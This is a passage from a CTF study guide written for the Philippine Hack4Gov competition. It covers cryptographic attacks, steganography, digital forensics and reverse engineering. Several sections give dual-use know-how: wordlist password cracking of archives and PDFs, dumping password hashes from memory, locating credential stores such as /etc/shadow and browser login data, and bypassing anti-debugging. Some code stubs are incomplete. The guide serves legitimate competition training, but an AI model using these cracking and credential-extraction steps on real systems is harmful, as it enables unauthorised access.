    # Often uses Spanish/Tagalog substitution
    pass

# Regional date formats (MM/DD/YYYY or DD/MM/YYYY)
date_formats = [
    "%m%d%Y", "%d%m%Y", "%m%d%y", "%d%m%y",
    "%m-%d-%Y", "%d-%m-%Y"
]
```

## 17. Blockchain & Smart Contract Crypto

### Ethereum Private Key Recovery

```python
from eth_keys import keys
from eth_utils import decode_hex

def recover_eth_private_key(r, s, v, msg_hash):
    # ECDSA signature to public key
    signature = keys.Signature(vrs=(v, r, s))
    public_key = signature.recover_public_key_from_msg_hash(msg_hash)
    return public_key.to_hex()

# Weak randomness in signatures
def check_weak_k_ethereum(signatures):
    # Look for repeated r values (nonce reuse)
    r_values = [sig['r'] for sig in signatures]
    if len(r_values) != len(set(r_values)):
        # Nonce reused, private key recoverable
        return True
```

## 18. Modern Cipher Attacks

### ChaCha20 Attacks

```python
# Counter overflow
def chacha20_counter_overflow(nonce, counter_start=0):
    # After 2^32 blocks, counter wraps
    # Keystream repeats after 256 GB
    overflow_point = 2**32 - counter_start
    return overflow_point * 64  # bytes until repeat
```

### AES-GCM Authentication Bypass

```python
def gcm_forbidden_attack(ciphertext, tag, nonce):
    # If nonce reused, authentication can be forged
    # Requires two messages with same nonce
    pass  # Complex polynomial arithmetic

# Truncated tag weakness
def gcm_short_tag_forge(tag_bits):
    # Probability of forgery = 2^(-tag_bits)
    if tag_bits < 96:
        print(f"Weak! Forgery chance: 1 in {2**tag_bits}")
```

## 19. Lattice-Based Attacks

### Knapsack Cryptosystem

```python
def knapsack_attack(public_key, ciphertext):
    # LLL lattice reduction attack
    from sage.all import matrix, ZZ
    
    n = len(public_key)
    M = matrix(ZZ, n + 1, n + 1)
    
    # Build lattice basis
    for i in range(n):
        M[i, i] = 2
        M[i, n] = public_key[i]
    M[n, n] = ciphertext
    
    # LLL reduction
    M_reduced = M.LLL()
    
    # Find solution vector
    for row in M_reduced:
        if all(x in [-1, 1] for x in row[:-1]):
            return [(x + 1) // 2 for x in row[:-1]]
```

## 20. CTF Speed Tips

### Quick Check Script

```python
#!/usr/bin/env python3
import base64, codecs, binascii

def try_all_decodings(data):
    results = []
    
    # Try as string
    if isinstance(data, str):
        # Base64
        try:
            results.append(("Base64", base64.b64decode(data)))
        except: pass
        
        # Hex
        try:
            results.append(("Hex", bytes.fromhex(data)))
        except: pass
        
        # ROT13
        try:
            results.append(("ROT13", codecs.decode(data, 'rot_13')))
        except: pass
        
        # URL decode
        try:
            from urllib.parse import unquote
            results.append(("URL", unquote(data)))
        except: pass
    
    # Try as bytes
    if isinstance(data, bytes):
        # XOR with common keys
        for key in [0x00, 0xff, 0x41, 0x42, ord(' ')]:
            results.append((f"XOR-{hex(key)}", xor(data, key)))
    
    return results

# Auto-detect and decode
def auto_decode(data):
    for name, decoded in try_all_decodings(data):
        print(f"{name}: {decoded[:50]}...")
        if b'flag' in decoded.lower() or b'ctf' in decoded.lower():
            print(f"POSSIBLE FLAG: {decoded}")
```

### Parallel Brute Force

```python
from multiprocessing import Pool
import itertools

def check_key(args):
    key, ciphertext = args
    # Your decryption logic here
    plaintext = decrypt(ciphertext, key)
    if b'flag{' in plaintext:
        return key, plaintext
    return None

def parallel_bruteforce(ciphertext, charset, key_length):
    with Pool() as pool:
        keys = itertools.product(charset, repeat=key_length)
        args = [(key, ciphertext) for key in keys]
        
        for result in pool.imap_unordered(check_key, args, chunksize=1000):
            if result:
                return result
```

### CTF Time Savers

```bash
# One-liner to try common operations
echo "encoded_string" | base64 -d 2>/dev/null || echo "encoded_string" | xxd -r -p 2>/dev/null || echo "encoded_string" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Quick frequency analysis
cat file.txt | fold -w1 | sort | uniq -c | sort -rn | head -20

# Extract all strings and grep for flags
strings -n 8 file | grep -E '(flag|FLAG|ctf|CTF){.*}'

# Batch hash cracking
for hash in $(cat hashes.txt); do echo $hash | hashid -j; done
```

**Remember:**

- Philippine government CTFs may include references to government agencies (DICT, DOST, NPC, etc.)
- Check for Tagalog/Filipino words as keys
- Consider historical Filipino ciphers and codes
- Timezone considerations (PHT = UTC+8)

---

# Steganography

_A comprehensive guide for solving steganography challenges in CTF competitions_

## What is Steganography?

Steganography is the practice of concealing information within another message or physical object. In CTF challenges, data is often hidden in images, audio files, videos, or other digital media.

## General Approach

### Initial Analysis

1. **File identification**
    
    ```bash
    file [filename]  # Identify actual file type
    ```
    
2. **Metadata extraction**
    
    ```bash
    exiftool [filename]  # Extract EXIF and metadata
    exiftool -a -u [filename]  # Show all metadata including unknown tags
    ```
    
3. **Binary analysis with binwalk**
    
    ```bash
    binwalk [filename]  # Scan for embedded files
    binwalk -e [filename]  # Extract embedded files
    binwalk -D 'png image:png' [filename]  # Extract specific signature
    binwalk --dd='.*' [filename]  # Extract all signatures
    binwalk -M [filename]  # Recursively scan extracted files
    ```
    
4. **File carving with foremost**
    
    ```bash
    foremost -v [filename]  # Verbose file carving
    foremost -t all -i [filename]  # Extract all supported file types
    ```
    
5. **Strings analysis**
    
    ```bash
    strings [filename] | grep -i "flag"  # Search for flag patterns
    strings -n 8 [filename]  # Show strings at least 8 chars long
    strings -a [filename]  # Scan entire file
    ```
    

## Image Steganography

### Basic Analysis

1. **Visual inspection** - Open image, check for obvious anomalies
2. **Reverse image search**
    - TinEye: https://www.tineye.com/
    - Google Images reverse search
    - Compare MD5 hashes of similar images

### File Structure Analysis

1. **Check file signatures** (magic bytes)
    
    - PNG: `89 50 4E 47 0D 0A 1A 0A`
    - JPEG: `FF D8 FF`
    - GIF: `47 49 46 38`
    - BMP: `42 4D`
2. **PNG specific checks**
    
    ```bash
    pngcheck -v [filename.png]  # Verbose PNG validation
    pngcheck -7 [filename.png]  # Print contents of tEXt chunks
    ```
    
3. **Fix corrupted headers**
    
    ```bash
    hexedit [filename]  # Manual hex editing
    xxd [filename] | head  # View hex dump
    ```
    

### Steganography Tools

1. **Stegsolve** (Java tool)
    
    ```bash
    java -jar Stegsolve.jar
    ```
    
    - Analyze bit planes
    - Apply filters (Alpha, Red, Green, Blue planes)
    - XOR analysis
    - Stereogram solver
2. **zsteg** (PNG/BMP analysis)
    
    ```bash
    zsteg -a [filename.png]  # All analysis methods
    zsteg -E [filename.png]  # Extract data
    zsteg --lsb [filename.png]  # LSB steganography
    ```
    
3. **steghide**
    
    ```bash
    steghide info [filename]  # Check if file contains hidden data
    steghide extract -sf [filename]  # Extract without password
    steghide extract -sf [filename] -p [password]  # With password
    ```
    
4. **stegcracker** (Brute-force passwords)
    
    ```bash
    stegcracker [filename] [wordlist]
    stegcracker [filename] /usr/share/wordlists/rockyou.txt
    ```
    
5. **ImageMagick** (Image manipulation)
    
    ```bash
    convert [input] -negate [output]  # Invert colors
    convert [input] -colorspace Gray [output]  # Convert to grayscale
    compare [image1] [image2] [diff_output]  # Compare two images
    ```
    
6. **Additional tools**
    
    - **StegOnline**: https://georgeom.net/StegOnline (Upload and analyze)
    - **Steganalyse**: Statistical steganalysis
    - **OpenStego**: GUI tool for hiding/extracting data
    - **SilentEye**: Cross-platform steganography software
    - **Steganosuite**: `steganosuite -x [filename]` (Extract data)

### Advanced Image Techniques

1. **LSB (Least Significant Bit) Analysis**
    - Check RGB color channels separately
    - Look for patterns in LSB bits
2. **JPEG Steganography**
    
    ```bash
    jsteg reveal [filename.jpg] [output]  # JSteg extraction
    outguess -r [filename.jpg] [output]  # OutGuess extraction
    stegdetect [filename.jpg]  # Detect steganography method
    ```
    
1. **QR Codes in Images**
    - Use online QR decoders
    - `zbarimg [filename]` - Scan for barcodes/QR codes
2. **Text Recognition (OCR)**
    
    ```bash
    tesseract [image] [output] -l eng  # OCR with English
    tesseract [image] stdout  # Output to terminal
    ```
    

## Audio Steganography

### Analysis Tools

1. **Audacity** (Audio editor)
    - Analyze → Plot Spectrum
    - View → Show Spectrogram
    - Check for hidden messages in spectrograms
    - Look for patterns at specific frequencies
2. **Sonic Visualiser**
    - Layer → Add Spectrogram
    - Pane → Add Peak Frequency Spectrogram
    - Check different transform parameters
3. **DeepSound** (Windows)
    - Extract hidden files from audio
    - Supports password protection
4. **SilentEye**
    - Cross-platform audio steganography
5. **Additional audio tools**
    
    ```bash
    sox [input.wav] -n spectrogram  # Generate spectrogram
    multimon-ng -t wav [file.wav]  # Decode digital transmissions
    ```
    

### Audio Techniques

- **DTMF Tones**: Decode phone keypad tones
- **Morse Code**: Listen for dots and dashes
- **SSTV (Slow Scan TV)**: Hidden images in audio
- **Backmasking**: Reversed audio messages

## Compressed Files

### ZIP Files

1. **Analysis**
    
    ```bash
    zipdetails -v [file.zip]  # Internal structure details
    zipinfo [file.zip]  # Detailed zip information
    7z l [file.zip]  # List contents with 7zip
    ```
    
2. **Repair corrupted zips**
    
    ```bash
    zip -FF [input.zip] --out [output.zip]
    zip -F [input.zip] --out [output.zip]  # Less aggressive repair
    ```
    
3. **Password cracking**
    
    ```bash
    fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt [file.zip]
    john --wordlist=/usr/share/wordlists/rockyou.txt [hash]
    hashcat -m 17200 [hash] [wordlist]  # PKZIP
    ```
    

### Other Archives

1. **7z files**
    
    ```bash
    7z2hashcat32-1.3.exe [filename.7z] > [hash.txt]
    john --wordlist=/usr/share/wordlists/rockyou.txt [hash.txt]
    ```
    
2. **RAR files**
    
    ```bash
    rar2john [file.rar] > [hash.txt]
    john [hash.txt]
    ```
    

## Text Steganography

1. **Whitespace steganography**
    - SNOW: `snow -C [file.txt]`
    - Check for tabs vs spaces patterns
2. **Zero-width characters**
    - Unicode steganography
    - Check for U+200B, U+200C, U+200D characters
3. **Spam steganography**
    - http://www.spammimic.com/
4. **Bacon cipher** - Binary encoding using two fonts/cases
5. **Null cipher** - Hidden message in first letters
    

## PDF Files

### PDF Analysis Tools

1. **qpdf**
    
    ```bash
    qpdf --show-all-pages [file.pdf]
    qpdf --filtered-stream-data [file.pdf]
    qpdf --decrypt [input.pdf] [output.pdf]
    ```
    
2. **PDFStreamDumper** (Windows GUI)

    - Analyze PDF streams
    - Extract embedded files
    - JavaScript analysis

3. **pdfinfo & pdfimages**
    
    ```bash
    pdfinfo [file.pdf]  # Document information
    pdfimages -all [file.pdf] [prefix]  # Extract all images
    pdfimages -j [file.pdf] [prefix]  # Extract as JPEG
    ```
    
4. **pdfcrack**
    
    ```bash
    pdfcrack -f [file.pdf] -w /usr/share/wordlists/rockyou.txt
    ```
    
5. **Advanced PDF tools**
    
    ```bash
    pdfdetach -list [file.pdf]  # List attachments
    pdfdetach -saveall [file.pdf]  # Extract attachments
    pdftotext [file.pdf] [output.txt]  # Extract text
    pdf-parser.py -v [file.pdf]  # Detailed analysis
    peepdf -if [file.pdf]  # Interactive console
    pdfid [file.pdf]  # Scan for suspicious elements
    ```
    

## Video Steganography

1. **Extract frames**
    
    ```bash
    ffmpeg -i [video.mp4] frame_%04d.png
    ```
    
2. **Check audio track separately**
    
    ```bash
    ffmpeg -i [video.mp4] -vn -acodec copy [audio.mp3]
    ```
    
3. **OpenPuff** - Multi-carrier steganography
    

## Network Steganography

1. **PCAP analysis**
    
    ```bash
    tshark -r [file.pcap] -Y "http"
    tcpdump -r [file.pcap] -A  # ASCII output
    ```
    
2. **Protocol steganography**
    
    - Check ICMP payloads
    - DNS tunneling
    - HTTP headers

## File System & Disk Images

1. **Mount and analyze**
    
    ```bash
    mount [image.img] /mnt/point
    autopsy [disk.img]  # Forensic browser
    ```
    
2. **File recovery**
    
    ```bash
    photorec [disk.img]
    testdisk [disk.img]
    ```
    

## Advanced Techniques

### Custom Encoding

1. **Base encodings**
    
    - Base64, Base32, Base85
    - Custom alphabets
2. **Esoteric languages**
    
    - Brainfuck, Malbolge, Whitespace
    - Piet (images as code)

### Cryptography Integration

1. **XOR operations**
    
    ```python
    # XOR with key
    result = bytes([a ^ b for a, b in zip(data, key)])
    ```
    
2. **Classical ciphers**
    
    - Caesar, Vigenere, Substitution
    - Use CyberChef for quick analysis

## Online Tools & Resources

### Multi-purpose

- **CyberChef**: https://gchq.github.io/CyberChef/
- **StegOnline**: https://georgeom.net/StegOnline
- **Steganography Toolkit**: https://github.com/DominicBreuker/stego-toolkit

### Image Specific

- https://futureboy.us/stegano/decinput.html
- http://stylesuxx.github.io/steganography/
- https://www.mobilefish.com/services/steganography/steganography.php
- https://manytools.org/hacker-tools/steganography-encode-text-into-image/
- http://magiceye.ecksdee.co.uk/ (Stereograms)

### Audio Specific

- https://steganosaur.us/dissertation/tools/audio

## CTF Strategy Tips

1. **Start simple** - Check obvious things first (strings, file, exiftool)
2. **Keep notes** - Document what you've tried
3. **Look for patterns** - Repeated bytes, suspicious sections
4. **Check everything** - Filenames, timestamps, comments
5. **Think creatively** - Challenges often combine multiple techniques
6. **Use automation** - Write scripts for repetitive tasks
7. **Collaborate** - Different perspectives help

## Common CTF Patterns

1. **Multi-layer challenges** - One file hidden in another, recursively
2. **Password chains** - Password for one file found in another
3. **Split flags** - Parts of flag in different locations
4. **Red herrings** - Intentional false leads
5. **Wordplay** - Passwords often relate to challenge theme

## Quick Reference Commands

```bash
# Quick scan workflow
file challenge.file
strings challenge.file | grep -i flag
binwalk -e challenge.file
foremost challenge.file
exiftool challenge.file

# For images
stegsolve.jar  # GUI analysis
zsteg -a image.png
steghide extract -sf image.jpg

# For audio
sonic-visualiser audio.wav
audacity audio.wav

# For archives
fcrackzip -D -u -p rockyou.txt file.zip
```

---

_Remember: In CTF challenges, if something seems unusual or out of place, it's probably intentional. Keep trying different approaches and tools until you find the flag!_

---

# Digital Forensics

## 1. Initial File Analysis & Triage

### First Steps with Any Evidence File

```bash
# Always start with these commands
file <filename>                    # Identify file type
exiftool <filename>                 # Extract metadata
strings -a <filename> | less        # Extract ASCII strings
strings -a -el <filename> | less    # Extract Unicode strings (Windows)
binwalk <filename>                  # Identify embedded files
xxd <filename> | head -50          # View hex dump
```

### When `file` command returns "data"

- Try `binwalk -e <filename>` to extract embedded files
- Use `foremost -i <filename> -o output_dir` for file carving
- Check with `photorec` for deeper recovery
- Try `scalpel` with custom configuration
- Use `bulk_extractor -o output_dir <filename>` for artifact extraction

## 2. Memory Forensics

### Volatility 3 (Recommended)

```bash
# Identify profile/OS
vol.py -f memory.raw windows.info
vol.py -f memory.raw linux.info

# Windows Memory Analysis
vol.py -f memory.raw windows.pslist              # List processes
vol.py -f memory.raw windows.pstree              # Process tree
vol.py -f memory.raw windows.cmdline             # Command line args
vol.py -f memory.raw windows.netscan             # Network connections
vol.py -f memory.raw windows.filescan            # Scan for files
vol.py -f memory.raw windows.dumpfiles --pid <PID>  # Dump process files
vol.py -f memory.raw windows.hashdump            # Dump password hashes
vol.py -f memory.raw windows.registry.hivelist   # List registry hives
vol.py -f memory.raw windows.registry.printkey   # Print registry keys
vol.py -f memory.raw windows.malfind            # Find injected code
vol.py -f memory.raw windows.vadinfo --pid <PID> # Virtual address descriptor

# Linux Memory Analysis
vol.py -f memory.raw linux.pslist               # Process list
vol.py -f memory.raw linux.bash                 # Bash history
vol.py -f memory.raw linux.elfs                 # Extract ELF binaries
```

### Volatility 2 (Legacy)

```bash
volatility -f memory.raw imageinfo              # Get profile
volatility -f memory.raw --profile=<profile> pslist
volatility -f memory.raw --profile=<profile> consoles  # Console history
volatility -f memory.raw --profile=<profile> clipboard # Clipboard content
```

## 3. Disk Image Analysis

### Mounting and Extraction

```bash
# E01 (EnCase) Images
ewfmount image.E01 /mnt/ewf
mount -o ro,loop /mnt/ewf/ewf1 /mnt/evidence

# Raw Images
mount -o ro,loop image.raw /mnt/evidence

# Fix corrupted filesystems
e2fsck -f image.raw              # ext2/3/4
ntfsfix image.raw                 # NTFS
fsck.vfat image.raw              # FAT32
```

### Autopsy (GUI Alternative)

- Create new case → Add data source → Select image
- Automated analysis modules:
    - Recent Activity
    - Hash Lookup
    - Keyword Search
    - Email Parser
    - Registry Analysis

### FTK Imager

- File → Add Evidence Item → Image File
- Export files: Right-click → Export Files
- Create forensic images: File → Create Disk Image

## 4. File Carving & Recovery

### Foremost Configuration

```bash
# Edit /etc/foremost.conf for custom signatures
foremost -t all -i disk.raw -o output/
foremost -t pdf,jpg,png,doc -i disk.raw -o output/
```

### Photorec (Better for corrupted filesystems)

```bash
photorec disk.raw
# Select partition → File system type → Choose file types
```

### Scalpel (Faster, configurable)

```bash
# Edit /etc/scalpel/scalpel.conf
scalpel -b -o output/ disk.raw
```

### Bulk Extractor

```bash
bulk_extractor -o output/ -R disk.raw
# Extracts: emails, URLs, credit cards, phone numbers, etc.
# Check output/ for:
#   - email.txt, url.txt, domain.txt
#   - ccn.txt (credit cards)
#   - telephone.txt
#   - packets.pcap (network packets)
```

## 5. Windows Artifacts

### Registry Analysis

```bash
# RegRipper
rip.pl -r NTUSER.DAT -p userassist > output.txt
rip.pl -r SYSTEM -p services > services.txt
rip.pl -r SOFTWARE -p uninstall > uninstall.txt

# Manual Analysis - Key Locations
# User Activity:
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

# System Info:
SYSTEM\CurrentControlSet\Services
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SAM\Domains\Account\Users
```

### Event Log Analysis

```powershell
# Key Event IDs
4624 - Successful logon
4625 - Failed logon
4634 - Logoff
4648 - Explicit credentials logon
4672 - Special privileges assigned
4720 - User account created
4732 - User added to group
7045 - Service installed

# PowerShell Analysis Tools
.\DeepBlueCLI.ps1 .\Security.evtx
.\Chainsaw.exe hunt .\Logs\ --mapping sigma
.\hayabusa.exe -d .\Logs\ -o timeline.csv
```

### Windows Artifacts Locations

```
C:\Windows\Prefetch\               - Program execution
C:\Windows\System32\config\        - Registry hives
C:\Windows\System32\winevt\Logs\   - Event logs
C:\$Recycle.Bin\                   - Deleted files
C:\Windows\Tasks\                  - Scheduled tasks
C:\Windows\Temp\                   - Temporary files
%USERPROFILE%\AppData\             - Application data
%USERPROFILE%\NTUSER.DAT           - User registry
```

## 6. Linux Artifacts

### Important Locations

```bash
/var/log/              # System logs
/var/log/auth.log      # Authentication logs
/var/log/syslog        # System messages
/var/log/apache2/      # Web server logs
/home/*/.bash_history  # Command history
/etc/passwd           # User accounts
/etc/shadow           # Password hashes
/etc/crontab          # Scheduled tasks
/tmp/                 # Temporary files
~/.ssh/               # SSH keys and config
```

### Log Analysis Commands

```bash
# Failed login attempts
grep "Failed password" /var/log/auth.log

# Successful logins
grep "Accepted password" /var/log/auth.log

# Commands run with sudo
grep "COMMAND" /var/log/auth.log

# System timeline
grep -h "" /var/log/* | sort -k1,2
```

## 7. Web Browser Forensics

### Chrome/Chromium

```
Windows: %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\
Linux: ~/.config/google-chrome/Default/
Files:
- History (SQLite DB)
- Cookies
- Cache/
- Bookmarks (JSON)
- Login Data (passwords)
```

### Firefox

```
Windows: %APPDATA%\Mozilla\Firefox\Profiles\*.default\
Linux: ~/.mozilla/firefox/*.default/
Files:
- places.sqlite (history/bookmarks)
- cookies.sqlite
- formhistory.sqlite
- cache2/
```

### Browser Analysis Tools

```bash
# SQLite browser for manual analysis
sqlitebrowser History

# Hindsight (Chrome forensics)
python hindsight.py -i "Chrome\User Data\Default" -o output.xlsx

# Nirsoft Tools (Windows)
BrowsingHistoryView.exe
ChromeCacheView.exe
```

## 8. Mobile Forensics

### Android

```bash
# ADB for logical extraction
adb backup -apk -shared -all -system backup.ab
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar

# Important locations
/data/data/                    # App data
/data/media/0/                 # User files
/data/system/                  # System databases
/data/misc/wifi/               # WiFi configs
```

### iOS

- Use tools like iBackupBot, iPhone Backup Extractor
- iTunes backup locations:
    - Windows: `%APPDATA%\Apple Computer\MobileSync\Backup\`
    - Mac: `~/Library/Application Support/MobileSync/Backup/`

## 9. Network Forensics

### PCAP Analysis

```bash
# Wireshark filters
http.request.method == "POST"      # POST requests
dns                                 # DNS queries
tcp.flags.syn == 1                 # SYN packets
ftp                                # FTP traffic

# Command line
tshark -r capture.pcap -Y "http.request"
tcpdump -r capture.pcap -A         # ASCII output
```

### Network Artifacts from Memory

```bash
vol.py -f memory.raw windows.netscan
vol.py -f memory.raw linux.netstat
```

## 10. Steganography & Hidden Data

### Common Tools

```bash
steghide extract -sf image.jpg     # Extract hidden data
stegsolve                          # GUI analysis tool
zsteg image.png                    # PNG steganography
binwalk -e file                   # Extract embedded files
strings -n 8 file | grep -i flag  # Search for flags
exiftool -all= image.jpg          # Check/remove metadata
```

### Audio Steganography

```bash
sonic-visualiser                   # Spectrogram analysis
audacity                          # Audio editor with spectogram
hideme                           # Audio steganography tool
```

## 11. Quick CTF Tips for PH Hack4Gov

### Common Flag Formats

- `hack4gov{...}`
- `CTF{...}`
- `FLAG{...}`
- Base64 encoded flags
- MD5/SHA hashes as flags

### Quick Wins Checklist

1. ✅ Run `strings` and grep for "flag", "password", "ctf"
2. ✅ Check file metadata with `exiftool`
3. ✅ Look for hidden files (`.hidden`, `..`, spaces in names)
4. ✅ Check alternate data streams (Windows)
5. ✅ Look in slack space of files
6. ✅ Check for magic bytes manipulation
7. ✅ Try common passwords: admin, password, 123456
8. ✅ Check for base64/hex encoded strings
9. ✅ Look for GPS coordinates in images
10. ✅ Check browser saved passwords

### Time-Saving Commands

```bash
# Recursive string search
grep -r "flag{" ./ 2>/dev/null

# Find recently modified files
find . -type f -mtime -1

# Extract all URLs from memory dump
strings memory.raw | grep -Eo 'https?://[^ ]+' 

# Quick base64 decode
echo "encoded_string" | base64 -d

# Find all images and check EXIF
find . -name "*.jpg" -o -name "*.png" -exec exiftool {} \;
```

### Automation Scripts

```bash
#!/bin/bash
# Quick forensics script
echo "[+] Running initial analysis..."
file $1
echo "[+] Extracting strings..."
strings $1 > strings.txt
echo "[+] Running binwalk..."
binwalk -e $1
echo "[+] Running foremost..."
foremost -i $1 -o foremost_out
echo "[+] Checking for steganography..."
steghide extract -sf $1 2>/dev/null
echo "[+] Analysis complete!"
```

## 12. Additional Resources

### Online Tools

- [CyberChef](https://gchq.github.io/CyberChef/) - Data manipulation
- [VirusTotal](https://www.virustotal.com) - Malware analysis
- [Hybrid Analysis](https://www.hybrid-analysis.com) - Sandbox
- [RegexPal](https://www.regexpal.com) - Regex testing

### Documentation

- Volatility Command Reference
- SANS DFIR Cheat Sheets
- Forensics Wiki
- CTF Field Guide

---

**Remember:** In CTFs, always think outside the box. If something seems too complex, there might be a simpler solution. Good luck with PH Hack4Gov! 🇵🇭

---

# Reverse Engineering

## PH Hack4Gov Edition

---

## 🎯 Introduction & Mindset

Reverse Engineering is the art of analyzing code to understand its inner workings without access to source code. In CTF competitions, the goal is simple: **GET THE FLAG**. Perfect understanding isn't required - just enough to extract what you need.

### Key Principles:

- **Efficiency over perfection**: Don't reverse more than necessary
- **Pattern recognition**: Flags often follow formats like `flag{...}`, `CTF{...}`, `H4G{...}`
- **Time management**: Try quick wins before deep analysis
- **Tool mastery**: Know your tools well enough to be fast

---

## 📋 Universal First Steps

### Initial Reconnaissance

1. **File identification**
    
    ```bash
    file <filename>           # Identify file type
    xxd <filename> | head     # Check file headers manually
    binwalk <filename>        # Check for embedded files
    exiftool <filename>       # Extract metadata
    ```
    
2. **String analysis**
    
    ```bash
    strings <filename>                    # All strings
    strings -n 8 <filename>              # Minimum 8 characters
    strings <filename> | grep -i flag    # Search for flag patterns
    strings <filename> | grep -E "CTF|FLAG|flag|h4g|H4G"
    rabin2 -z <filename>                 # Alternative string extraction
    ```
    
3. **Entropy analysis**
    
    ```bash
    ent <filename>           # Check randomness (might indicate encryption/packing)
    binwalk -E <filename>    # Entropy graph
    ```
    

---

## 🔧 PE Files (.exe, .dll) - Windows Executables

### Static Analysis Tools

- **File Analysis**: DIE (Detect It Easy), PEiD, PEBear, PEView, CFF Explorer
- **Hex Editors**: HxD, 010 Editor, ImHex
- **Disassemblers**: IDA Pro/Free, Radare2, Binary Ninja
- **Decompilers**: Ghidra, Snowman, IDA Hex-Rays, RetDec

### Dynamic Analysis Tools

- **Debuggers**: x64dbg/x32dbg, OllyDbg, WinDbg, Immunity Debugger
- **API Monitoring**: API Monitor, WinAPIOverride, Rohitab API Monitor
- **Tracing**: Frida, Intel Pin, DynamoRIO

### Advanced PE Analysis

#### Packing Detection & Unpacking

```bash
# Common packers: UPX, Themida, VMProtect, ASPack, PECompact
upx -d <filename>         # UPX unpacking
# For other packers, use:
# - Scylla for import reconstruction
# - x64dbg with ScyllaHide plugin
# - Manual unpacking at OEP (Original Entry Point)
```

#### Anti-Debug Detection & Bypass

Common anti-debug techniques:

- `IsDebuggerPresent()` API check
- `CheckRemoteDebuggerPresent()`
- PEB.BeingDebugged flag check
- Timing checks (`GetTickCount`, `rdtsc`)
- Exception-based detection

Bypass methods:

- ScyllaHide plugin for x64dbg
- Modify PEB manually
- Hook/patch API calls
- Use kernel debugger (WinDbg)

#### Import Address Table (IAT) Analysis

```bash
# Check imports for interesting functions
dumpbin /imports <filename>    # Windows SDK tool
rabin2 -i <filename>           # Radare2
```

---

## 🐧 ELF Files (Linux Executables)

### Static Analysis

```bash
# File information
readelf -a <filename>          # Complete ELF analysis
objdump -d <filename>          # Disassembly
objdump -M intel -d <filename> # Intel syntax
nm <filename>                  # Symbol table
ldd <filename>                 # Shared library dependencies
checksec <filename>            # Security features check
```

### Dynamic Analysis

```bash
# Tracing
ltrace ./<filename>            # Library call trace
strace ./<filename>            # System call trace
strace -f -e trace=all ./<filename>  # Follow forks

# Debugging with GDB + Extensions
gdb ./<filename>
# Install one: peda, pwndbg, or gef
# pwndbg recommended for CTF
```

### Advanced ELF Techniques

#### Patching Binaries

```bash
# Using radare2
r2 -w <filename>
# In r2: s <address>; wx <hex_bytes>

# Using patchelf
patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 <filename>
patchelf --add-needed libexample.so <filename>
```

#### Dealing with Stripped Binaries

- Use string references to identify functions
- Look for syscall patterns
- Use function prologue/epilogue signatures
- Leverage dynamic analysis more heavily

---

## 📱 Android APK Files

### Decompilation & Analysis

```bash
# Decompile to smali
apktool d <filename.apk>

# Convert to Java
d2j-dex2jar <filename.apk>
# Then open with jd-gui or JADX

# One-stop solution
jadx <filename.apk>           # Best for most cases
jadx-gui <filename.apk>        # GUI version

# Quick inspection
unzip <filename.apk>           # APKs are zip files
```

### Dynamic Analysis

- **Android Studio Emulator** with root access
- **Genymotion** for faster emulation
- **Android Debug Bridge (ADB)**:
    
    ```bash
    adb devices                 # List devicesadb logcat                  # View logsadb shell                   # Shell accessadb pull/push              # File transfer
    ```
    

### Frida for Android

```bash
# Install frida-server on device
frida-ps -U                  # List processes
frida -U -f com.package.name # Spawn and attach
frida-trace -U -i "open*" com.package.name
```

---

## 🔷 .NET Files (.exe, .dll)

### Primary Tool: dnSpy

- **Decompilation**: Full C# source recovery
- **Debugging**: Step through decompiled code
- **Editing**: Modify and recompile
    - Right-click method → Edit Method (C#)
    - Compile → File → Save Module

### Alternative Tools

- **ILSpy**: Lightweight decompiler
- **dotPeek**: JetBrains decompiler
- **de4dot**: .NET deobfuscator
    
    ```bash
    de4dot <obfuscated.exe>
    ```
    

### .NET Core/5+ Analysis

- Extract single-file executables:
    
    ```bash
    dotnet-dump collect -p <pid>dotnet-dump analyze <dump_file>
    ```
    

---

## ☕ Java Files (.jar, .class)

### Decompilation

```bash
# For .class files
javap -c <classfile>         # Bytecode
javap -verbose <classfile>   # Detailed info

# For .jar files
jar xf <filename.jar>        # Extract
```

### GUI Decompilers

- **JADX**: Best overall, handles both Java and Android
- **JD-GUI**: Classic Java decompiler
- **Fernflower**: IntelliJ IDEA's decompiler
- **CFR**: Good for modern Java features
- **Procyon**: Handles Java 8+ features well

---

## 🐍 Python Files (.py, .pyc, .pyo, .exe)

### Decompilation

```bash
# For .pyc files
uncompyle6 <filename.pyc>
pycdc <filename.pyc>         # Alternative
decompyle3 <filename.pyc>    # Python 3.7+

# For Python EXE
python pyinstxtractor.py <filename.exe>
# Creates <filename.exe_extracted> folder
# Look for .pyc files inside
```

### Bytecode Analysis

```python
import dis
import marshal

with open('file.pyc', 'rb') as f:
    f.seek(16)  # Skip pyc header (varies by version)
    code = marshal.load(f)
    dis.dis(code)
```

### Obfuscation Handling

- **pyarmor**: Look for `_pytransform.dll`
- **pyobfuscate**: Pattern-based deobfuscation
- Manual deobfuscation through dynamic analysis

---

## 🛡️ Advanced Techniques

### Shellcode Analysis

```bash
# Tools
scdbg -f shellcode.bin       # Emulate shellcode
shellcode2exe shellcode.bin  # Convert to PE

# Manual analysis
echo -ne "\x31\xc0\x50..." | ndisasm -b32 -
echo -ne "\x31\xc0\x50..." | ndisasm -b64 -
```

### Cryptographic Challenges

1. **Identify the algorithm**:
    
    - Look for magic constants (MD5, SHA, AES)
    - Check for S-boxes, round functions
    - Identify key sizes and IV usage
2. **Common weaknesses**:
    
    - Hardcoded keys/IVs
    - Weak random number generation
    - Known plaintext attacks
    - Side-channel leaks in implementation

### Anti-Analysis Techniques

#### VM-based Protection

- **VMProtect**, **Themida**, **Code Virtualizer**
- Approach: Focus on I/O operations rather than logic
- Tools: VMAttack, VTIL

#### Control Flow Flattening

- Identify dispatcher blocks
- Reconstruct original flow through tracing
- Use symbolic execution (angr, Triton)

---

## 🚀 CTF-Specific Tips

### Quick Win Strategies

1. **Check for low-hanging fruit**:
    
    ```bash
    strings binary | grep -E "flag{.*}"
    ltrace ./binary 2>&1 | grep flag
    strace -s 1000 ./binary 2>&1 | grep flag
    ```
    
2. **Common flag locations**:
    
    - Command-line arguments
    - Environment variables
